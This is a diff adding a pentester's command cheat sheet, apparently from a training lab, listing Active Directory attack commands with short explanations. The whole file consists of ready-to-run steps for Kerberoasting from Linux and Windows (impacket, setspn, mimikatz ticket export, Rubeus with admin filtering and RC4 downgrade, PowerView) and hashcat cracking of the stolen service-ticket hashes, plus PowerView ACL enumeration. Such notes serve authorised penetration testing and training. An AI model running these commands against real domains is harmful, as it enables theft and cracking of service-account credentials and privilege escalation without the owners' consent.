@@ -1,0 +1,27 @@
+#Kerberoasting linux 
+impacket-GetUserSPNs $(vselector dcname)/$(vselector dcuser ) -dc-ip $(vselector dcip) <-> this cmd used to list all the service accounts in the domain
+impacket-GetUserSPNs $(vselector dcname)/$(vselector dcuser ) -dc-ip $(vselector dcip) -request <-> this cmd used to request all the service accounts in the domain
+impacket-GetUserSPNs $(vselector dcname)/$(vselector dcuser ) -dc-ip $(vselector dcip) -request-user sqldev <-> this cmd used to request specific service account in the domain
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt <-> to crack the TGS hash 
+#Kerberoasting windows 
+setspn.exe -Q */* <-> this cmd used to list all the service accounts in the domain manual approach
+setspn.exe -T $(vselector dcname) -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } <-> select all the tickets using setspn
+mimikatz.exe "log mimikatz.log" "base64 /out:true" "kerberos::list /export" exit <-> export all the tickets using mimikatz from memory this is done after you get the tickets
+echo "$(vselector ticket_base64)" |  tr -d \\n <-> if there is some newline this cmd remove all the newline and make it one line base64 
+echo "$(vselector ticket_base64)" | base64 -d > svname.kirbi <-> this cmd decode the base64 and save it to a file
+python2.7 kirbi2john.py sqldev.kirbi <-> this will extract the kerberos ticket 
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat <-> this cmd convert the extracted ticket to hashcat format
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt <-> to crack the TGS HASH 
+Get-DomainUser * -spn | select samaccountname <-> list all SPN need PowerView module
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat <-> get specific SPN ticket in hashcat format need PowerView module
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation <-> extract all the SPN tickets in hashcat format need PowerView module
+.\Rubeus.exe kerberoast /stats <-> show stats of kerberoasting
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap <-> kerberoast only admin accounts 
+.\Rubeus.exe kerberoast /user:testspn /nowrap <-> kerberoast specific user
+.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap <-> kerberoast user with constrained delegation force RC4 encryption 
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes <-> to check the encryption type of the user
+#ACL Enumeration 
+$sid = Convert-NameToSid wley <-> to get SID of the user need PowerView module
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid} <-> to get all the ACLs of the user need PowerView module 
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl <-> to get the name of ACL  need PowerView and GUID
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}  <-> this cmd will get the ACLs with names need PowerView module 
